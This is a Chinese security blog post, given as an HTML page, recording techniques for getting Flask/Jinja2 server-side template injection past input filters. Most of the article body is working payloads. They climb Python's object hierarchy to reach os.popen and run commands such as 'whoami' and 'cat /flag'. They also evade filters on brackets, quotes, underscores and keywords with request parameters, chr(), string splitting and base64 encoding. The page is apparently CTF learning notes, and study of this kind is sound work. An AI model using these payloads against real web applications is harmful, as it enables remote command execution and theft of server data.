@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>记录-python模板注入（SSTI）bypass | 悦昕_o&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="悦昕_o's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">悦昕_o&#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">不来不去 如来 o(*￣▽￣*)ブ</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-记录-python模板注入（SSTI）bypass" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      记录-python模板注入（SSTI）bypass
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2020-08-05T07:25:09.000Z" itemprop="datePublished">2020年08月05日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">漏洞学习</a>
+  </div>
+
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2020/08/05/%E8%AE%B0%E5%BD%95-python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88SSTI%EF%BC%89bypass/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-获取基本类"><a href="#0x01-获取基本类" class="headerlink" title="0x01 获取基本类"></a>0x01 获取基本类</h2><p>可以通过python的一些基本类，jinja2中的内置对象、内置函数（比如对象request，函数url_for和get_flashed_messages）；有时候可能需要结合实际情况进行一些变动。</p>
+<span id="more"></span>
+
+<blockquote>
+<p>Flask 的一些内置函数、内置对象：<br>内置对象：<code>request, config, session, g, current_app等</code><br>内置函数：<code>url_for, get_flashed_messages等</code><br>jinja2内置全局函数：<code>dict(), joiner(), cycler, lipsum, range, namespace等</code></p>
+<p>如果还要更多可用函数、对象；可以从这几个方向查找文档：① Flask 的内置函数、对象。② 模板引擎<a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/?highlight=joiner#list-of-global-functions">jinja2</a>的内置函数、对象。</p>
+</blockquote>
+<p>以下是获取基类的一些实现方法：</p>
+<ul>
+<li><code>&#39;&#39;.__class__.__mro__[1]</code></li>
+<li><code>&#123;&#125;.__class__.__bases__[0]</code></li>
+<li><code>().__class__.__bases__[0]</code></li>
+<li><code>[].__class__.__bases__[0]</code></li>
+<li><code>request.__class__.__mro__[8]</code></li>
+</ul>
+<h2 id="0x02-bypass绕过"><a href="#0x02-bypass绕过" class="headerlink" title="0x02 bypass绕过"></a>0x02 bypass绕过</h2><ul>
+<li><h3 id="中括号被过滤"><a href="#中括号被过滤" class="headerlink" title="中括号被过滤"></a>中括号被过滤</h3></li>
+</ul>
+<ol>
+<li>使用 <strong><code>__getitem__()</code></strong> 进行绕过<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__mro__[i]</span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line">__mro__.__getitem(i)</span><br></pre></td></tr></table></figure></li>
+<li><strong>pop()</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()[i]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">__subclasses__().pop(i)</span><br></pre></td></tr></table></figure></li>
+<li><strong><code>__bases__.0.</code></strong>(这个本地测试未成功)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__<span class="number">.0</span>.__subclasses__()<span class="number">.59</span>.__init__.__globals__.linecache.os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><h3 id="引号被过滤"><a href="#引号被过滤" class="headerlink" title="引号被过滤"></a>引号被过滤</h3></li>
+</ul>
+<ol>
+<li><p>将需要的函数或值放在请求中作为参数，借助<code>request</code>对象获取值（这种方法在沙盒逃逸中行不通，只有web接收参数形式有可能），如果是函数，还需配合<code>attr</code>或<code>__getattribute__</code>获得。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># request.args.key, request.values.key</span></span><br><span class="line"><span class="comment"># 1、利用request对象获取值：</span></span><br><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__.os.popen(request.args.a).read()&#125;&#125;&amp;a=<span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、request对象配合`attr`或`__getattribute__`从请求参数处获取函数：</span></span><br><span class="line">&#123;&#123; config|attr(request.args.a) &#125;&#125;&amp;a=__class__</span><br><span class="line">&#123;&#123; config.__getattribute__(request.args.a) &#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure>
+<p>另，如果request被过滤了，可以利用<code>__str__</code>拼接出想要的字符串： </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__str__()[<span class="number">3</span>]+config.__str__()[<span class="number">2</span>] &#125;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找出chr函数，利用set复制，然后使用。（<em>TODO：或许也可以试着用<code>__str__</code>拼接？</em> ）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">92</span>].__init__.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__.os.popen(<span class="built_in">chr</span>(<span class="number">100</span>)%2bchr(<span class="number">105</span>)%2bchr(<span class="number">114</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/05/%E8%AE%B0%E5%BD%95-python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88SSTI%EF%BC%89bypass/20200805112412104_6963.jpg" alt="2020-08-05_110854"></p>
+</li>
+</ol>
+<ul>
+<li><h3 id="双下划线（-）被过滤"><a href="#双下划线（-）被过滤" class="headerlink" title="双下划线（__）被过滤"></a>双下划线（__）被过滤</h3></li>
+</ul>
+<ol>
+<li>借助<code>request</code>对象<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如：</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[request.values.<span class="keyword">class</span>]&#125;&#125;&amp;<span class="keyword">class</span>=__class__</span><br><span class="line">&#123;&#123; config|attr(request.args.a) &#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><h3 id="被过滤"><a href="#被过滤" class="headerlink" title="{ {被过滤"></a><code>&#123; &#123;</code>被过滤</h3><p>可以利用<code>&#123; % payload % &#125;</code>标记，可以考虑盲注或带外（如<code>curl</code>）。<br>结构如： </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&quot;&quot;</span>.__class__ %&#125;test&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3></li>
+</ul>
+<ol>
+<li>拼接<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如：</span></span><br><span class="line">&#123;&#123; session[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>][<span class="string">&#x27;__subcla&#x27;</span>+<span class="string">&#x27;sses__&#x27;</span>]()[<span class="number">117</span>].__init__.__globals__[<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure></li>
+<li>编码（未深入研究）<br>编码方式包括但不限于：base64、rot13、16进制编码等<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)</span><br><span class="line"><span class="comment"># 等价于：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;ZXZhbA==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="0x03-其他"><a href="#0x03-其他" class="headerlink" title="0x03 其他"></a>0x03 其他</h2><ul>
+<li><p>reload方法：如果内建函数大部分被删除，可用reload进行重载。如：<code>reload(__builtins__)</code>。</p>
+</li>
+<li><p>python环境常用命令执行方法（未深入）</p>
+<ul>
+<li>os.system(command)</li>
+<li>os.popen(command[,mode[,bufsize]])</li>
+<li>subprocess</li>
+</ul>
+</li>
+<li><p>flask框架request获取参数的一些基本用法</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">request.method 　　　　　　<span class="comment">#获取请求方法</span></span><br><span class="line">request.form 　　　　　　<span class="comment">#获取post请求所有参数</span></span><br><span class="line">request.form.get(<span class="string">&quot;name&quot;</span>) 　　　　　　<span class="comment">#获取post请求body中参数key为name的value参数</span></span><br><span class="line">request.args 　　　　　　<span class="comment">#获取get请求所有参数</span></span><br><span class="line">request.args.get(<span class="string">&quot;name&quot;</span>) 　　　　　　<span class="comment">#获取get请求url参数中key为name的value参数</span></span><br><span class="line">request.values 　　　　　　<span class="comment">#获取get、post请求参数</span></span><br><span class="line">request.cookies 　　　　　　<span class="comment">#获取请求的cookies</span></span><br><span class="line">request.headers 　　　　　　<span class="comment">#获取所有头部信息</span></span><br><span class="line">request.headers.get(<span class="string">&quot;User-Agent&quot;</span>)  　　　　　　<span class="comment">#获取头部信息中User-Agent信息</span></span><br><span class="line">request.url 　　　　　　<span class="comment">#获取请求的完整url：http://127.0.0.1:8080/integration/qryUserActivity.sync?mobile=15013440000&amp;id=123456</span></span><br><span class="line">request.script_root</span><br><span class="line">request.path 　　　　　　<span class="comment">#获取请求的资源地址：/integration/qryUserActivity.sync</span></span><br><span class="line">request.base_url 　　　　　　<span class="comment">#获取请求的基础地址：http://127.0.0.1:8081/integration/qryUserActivity.sync</span></span><br><span class="line">request.url_root 　　　　　　<span class="comment">#获取服务器与端口地址：http://127.0.0.1:8081/</span></span><br><span class="line">request.files(<span class="string">&quot;filename&quot;</span>) 　　　　　　<span class="comment">#获取请求时上传的文件，filename为文件名字</span></span><br><span class="line"><span class="comment"># 更多功能见(https://dormousehole.readthedocs.io/en/latest/search.html?q=request)。</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://p0sec.net/index.php/archives/120/">Flask&#x2F;Jinja2模板注入中的一些绕过姿势</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8029">浅谈flask ssti 绕过原理</a></li>
+<li><a target="_blank" rel="noopener" href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/">深入SSTI-从NCTF2018两道Flask看bypass新姿势</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172#h3-16">SSTI&#x2F;沙盒逃逸详细总结</a></li>
+</ul>
+
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E8%8E%B7%E5%8F%96%E5%9F%BA%E6%9C%AC%E7%B1%BB"><span class="toc-text">0x01 获取基本类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-bypass%E7%BB%95%E8%BF%87"><span class="toc-text">0x02 bypass绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-text">中括号被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-text">引号被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E4%B8%8B%E5%88%92%E7%BA%BF%EF%BC%88-%EF%BC%89%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-text">双下划线（__）被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-text">{ {被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-text">过滤关键字</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%85%B6%E4%BB%96"><span class="toc-text">0x03 其他</span></a></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://leonardo-o1.github.io/2020/08/05/记录-python模板注入（SSTI）bypass/">https://leonardo-o1.github.io/2020/08/05/记录-python模板注入（SSTI）bypass/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>
+
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
+      
+      
+        
+<nav id="article-nav">
+  
+    <a href="/2020/07/26/ueditor-1-4-3-3-net%E7%89%88-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">older</strong>
+      <div class="article-nav-title">
+        
+          ueditor 1.4.3.3 .net版 任意文件上传漏洞分析与复现
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/05/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E7%BB%95waf/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">newer</strong>
+      <div class="article-nav-title">
+        
+          记一次反射型xss绕waf
+        
+      </div>
+    </a>
+  
+</nav>
+
+      
+      
+        
+
+
+
+
+
+
+
+
+      
+    </footer>
+  </div>
+</article>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-posts"></i> 最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/22/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E7%BB%95waf/">记一次反射型xss绕waf</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/05/%E8%AE%B0%E5%BD%95-python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88SSTI%EF%BC%89bypass/">记录-python模板注入（SSTI）bypass</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/26/ueditor-1-4-3-3-net%E7%89%88-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">ueditor 1.4.3.3 .net版 任意文件上传漏洞分析与复现</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/12/De1CTF-wp/">De1CTF部分wp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/web%E6%BC%8F%E6%B4%9E/" style="font-size: 20px;">web漏洞</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">反序列化</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 20px;">记录</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-classify"></i> 分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">漏洞学习</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/">复现</a><span class="category-list-count">1</span></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022年</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020年</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019年</a><span class="archive-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-tag"></i> 标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag">web漏洞</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+</aside>
+        
+      </div>
+      <a id="totop" href="#top"></a>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <p>
+        <a href="/sitemap.xml">网站地图</a>
+        <span> | </span><a href="/atom.xml">订阅本站</a>
+        <span> | </span><a href="/about/">联系博主</a>
+      </p>
+      
+        <p>
+          <i class="fa fa-visitors"></i>
+          <i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>
+          ，
+          <i class="fa fa-views"></i>
+          <i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>
+        </p>
+      
+      <p>
+        <span>Copyright &copy; 2024 悦昕.</span>
+        <span>Theme by <a href="https://github.com/chaooo/hexo-theme-BlueLake/" target="_blank">BlueLake.</a></span>
+        <span>Powered by <a href="https://hexo.io/" target="_blank">Hexo.</a></span>
+      </p>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </div>
+  
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/search.json.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+  
+<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+    
+<script src="/localshare/js/social-share.js"></script>
+
+    
+<script src="/localshare/js/qrcode.js"></script>
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+
+
+
+
+</body>
+</html>
